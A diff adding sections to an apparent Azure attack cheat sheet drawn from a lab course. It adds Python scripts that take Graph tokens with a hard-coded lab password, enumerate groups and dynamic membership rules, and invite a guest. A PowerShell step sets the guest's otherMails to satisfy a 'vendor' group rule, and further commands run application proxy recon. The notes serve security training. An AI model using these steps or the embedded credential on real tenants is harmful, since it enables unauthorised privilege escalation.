@@ -555,6 +555,312 @@ If you have Intune Administrator you can execute commandos on the workstations
 5.  Script settings (Using logged on Credentials: No, Enfoce Script: No, 64 bit Powershell: Yes)
 6. Assignments: Add All Users
 
+### Dynamic Groups
+
+
+```python
+import http.client
+import json
+
+# Definición de variables
+client_id = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
+tenant_id = 'b6e0615d-2c17-46b3-922c-491c91624acd'
+username = 'thomasebarlow@defcorpit.onmicrosoft.com'
+password = r'test'
+scope = 'openid profile offline_access https://graph.microsoft.com/.default'
+
+# Cuerpo de la solicitud
+body = (
+    f'client_id={client_id}'
+    f'&grant_type=password'
+    f'&username={username}'
+    f'&password={password}'
+    f'&scope={scope}'
+    f'&client_info=1'
+)
+
+# Encabezados de la solicitud
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+# Conexión y solicitud
+conn = http.client.HTTPSConnection('login.microsoftonline.com')
+conn.request('POST', f'/{tenant_id}/oauth2/v2.0/token', body, headers)
+
+# Manejo de la respuesta
+response = conn.getresponse()
+status_code = response.status
+data = json.loads(response.read())
+conn.close()
+
+# Imprimir el código de estado
+print(status_code)
+```
+
+#### Abusing rule
+
+> Rule example: `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`
+
+##### Enumerate Groups script
+
+```python
+# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
+# https://www.alteredsecurity.com/azureadlab
+
+import http.client
+import json
+
+def get_access_token_with_username_password(client_id, tenant_id, username, password):
+
+    scope = "openid profile offline_access https://graph.microsoft.com/.default"
+    
+    # Prepare the body for the POST request
+    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"
+
+    
+    # Prepare headers
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+    
+    # Send the request
+    conn = http.client.HTTPSConnection("login.microsoftonline.com")
+    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
+    
+    response = conn.getresponse()
+    data = response.read()
+    conn.close()
+
+    # Parse and print the access token
+    token_response = json.loads(data)
+    
+    if "access_token" in token_response:
+        access_token = token_response['access_token']
+        print("[+] Access token acquired successfully.")
+        
+        # Call the function to list all groups
+        list_groups(access_token)
+    else:
+        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
+        return None
+
+def list_groups(access_token):
+    headers = {
+        'Authorization': f'Bearer {access_token}',
+        'Content-Type': 'application/json'
+    }
+    
+    # Parse the URL for the Graph API
+    conn = http.client.HTTPSConnection("graph.microsoft.com")
+    
+    # Send the request to get the list of groups
+    conn.request("GET", "/v1.0/groups", headers=headers)
+    response = conn.getresponse()
+    
+    if response.status == 200:
+        groups_data = response.read().decode('utf-8')
+        groups = json.loads(groups_data).get('value', [])
+        
+        # Iterate through each group and get membership details
+        for group in groups:
+            group_id = group['id']
+            group_name = group['displayName']
+            group_type = group.get('groupTypes', [])
+            membership_rule = group.get('membershipRule', None)
+            
+            print(f"\nGroup Name: {group_name}, Group Type: {group_type}")
+            
+            # Print the dynamic group rule if it exists
+            if membership_rule:
+                print(f"Membership Rule: {membership_rule}")
+            else:
+                pass
+            
+            # Get group members
+            members_url = f"/v1.0/groups/{group_id}/members"
+            conn.request("GET", members_url, headers=headers)
+            members_response = conn.getresponse()
+            
+            if members_response.status == 200:
+                members_data = members_response.read().decode('utf-8')
+                members = json.loads(members_data).get('value', [])
+                print(f"Members of {group_name}:")
+                for member in members:
+                    print(f" - {member.get('displayName')} ({member.get('userPrincipalName')})")
+            else:
+                print(f"[-] Failed to get members for group {group_name}: {members_response.status}")
+    else:
+        print(f"[-] Failed to get groups: {response.status} {response.read().decode('utf-8')}")
+    
+    # Close the connection
+    conn.close()
+
+
+def main():
+    # Example usage
+    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
+    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
+    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
+    password = r"DeployM3ntUserInTh3Tan3nt!!" # Remember to change this
+
+    get_access_token_with_username_password(client_id, tenant_id, username, password)
+
+if __name__ == '__main__':
+    main()
+```
+
+##### Invite guest script
+
+```python
+# This script is a part of Attacking and Defending Azure - Beginner's Edition course by Altered Security
+# https://www.alteredsecurity.com/azureadlab
+
+import http.client
+import json
+import argparse
+
+def get_access_token_with_username_password(client_id, tenant_id, username, password):
+
+    scope = "openid profile offline_access https://graph.microsoft.com/.default"
+    
+    # Prepare the body for the POST request
+    body = f"client_id={client_id}&grant_type=password&username={username}&password={password}&scope={scope}&client_info=1"
+    
+    # Prepare headers
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+    
+    # Send the request
+    conn = http.client.HTTPSConnection("login.microsoftonline.com")
+    conn.request("POST", f"/{tenant_id}/oauth2/v2.0/token", body, headers)
+    
+    response = conn.getresponse()
+    data = response.read()
+    conn.close()
+
+    # Parse and print the access token
+    token_response = json.loads(data)
+    
+    if "access_token" in token_response:
+        access_token = token_response['access_token']
+        print("[+] Access token acquired successfully.")
+        
+        return access_token
+    else:
+        print(f"[-] Failed to acquire token: {token_response.get('error_description')}")
+        return None
+
+
+def invite_guest(access_token, external_username_email):
+
+    print("[+] Inviting user...")
+    # Set up the connection to Microsoft Graph
+    conn = http.client.HTTPSConnection("graph.microsoft.com")
+
+    # Define the API endpoint
+    endpoint = "/v1.0/invitations"
+
+    # Define the headers, including the Authorization header with the provided access token
+    headers = {
+        'Authorization': f'Bearer {access_token}',
+        'Content-Type': 'application/json'
+    }
+
+    # Define the body with the email of the guest and some additional optional parameters
+    body = {
+        "invitedUserEmailAddress": external_username_email,
+        "inviteRedirectUrl": f"https://portal.azure.com",  # Update this URL to the actual app redirect URL
+        "sendInvitationMessage": True,  # This will send the invite email to the user
+        "invitedUserMessageInfo": {
+            "customizedMessageBody": "You are invited to collaborate on DefCorp External project." # Update this message to your own message
+        }
+    }
+
+    # Convert the body to a JSON string
+    body_json = json.dumps(body)
+
+    # Send the POST request to the Microsoft Graph API
+    conn.request("POST", endpoint, body_json, headers)
+
+    # Get the response from the server
+    response = conn.getresponse()
+
+    # Read the response data
+    data = response.read()
+
+    # Check if the request was successful
+    if response.status == 201:
+        # Parse the response data
+        invitation_data = json.loads(data)
+        invitation_link = invitation_data.get("inviteRedeemUrl")
+        object_id = invitation_data.get("invitedUser", {}).get("id")
+        print("[+] User invited successfully.\n")
+        print(f"Object ID: {object_id}")
+        print(f"Invitation link: {invitation_link}")
+        return invitation_link
+    else:
+        # Print the error message if the request failed
+        print("[-] Failed to invite user.")
+        print(f"[-] Error {response.status}: {data.decode('utf-8')}")
+        return None
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description='Azure AD B2B Guest Invitation Script')
+    # Add option to input external user email via argument
+    parser.add_argument('--external-user', type=str, help='External user email to invite')
+
+    # Parse command-line arguments
+    args = parser.parse_args()
+
+    if args.external_user:
+        external_username_email = args.external_user
+    else:
+        external_username_email = "student99@defcorpextcontractors.onmicrosoft.com" # Add your own user email here.
+        if not external_username_email:
+            raise ValueError("External user email not provided")
+
+    # Example usage
+    client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Public Client ID for Az CLI
+    tenant_id = "b6e0615d-2c17-46b3-922c-491c91624acd" # Tenant ID of DefCorp IT
+    username = "thomasebarlow@defcorpit.onmicrosoft.com" 
+    password = r"DeployM3ntUserInTh3Tan3nt!!" # Remember to change this
+
+    # Get the access token using the username and password
+    access_token = get_access_token_with_username_password(client_id, tenant_id, username, password)
+
+    if access_token:
+        invite_guest(access_token, external_username_email)
+    else:
+        print("[-] Failed to get access token.")
+        exit()
+
+if __name__ == '__main__':
+    main()
+```
+
+
+```powershell
+Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
+```
+
+### Proxy
+
+#### Recon
+
+```powershell
+# Find Applications
+. C:\AzAD\Tools\Get-MgApplicationProxyApplication.ps1
+# Find Service principal
+Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"
+
+. C:\AzAD\Tools\Get-MgApplicationProxyAssignedUsersAndGroups.ps1
+
+Get-MgApplicationProxyAssignedUsersAndGroups -ObjectId <ID APP>
+```
 
 
 ## References
